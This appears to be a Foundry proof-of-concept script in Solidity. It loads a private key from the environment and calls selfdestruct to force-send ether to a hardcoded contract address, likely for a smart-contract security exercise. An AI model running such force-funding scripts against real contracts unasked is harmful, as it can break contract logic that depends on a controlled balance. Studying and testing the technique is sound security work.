// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Script} from "forge-std/Script.sol";

contract POC is Script {
    function run() external payable {
        uint256 deployer = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployer);
        selfdestruct(0xD0350fE26d963C9B0974Cab2b5a55D72B02566a3);
        vm.stopBroadcast();
    }
}
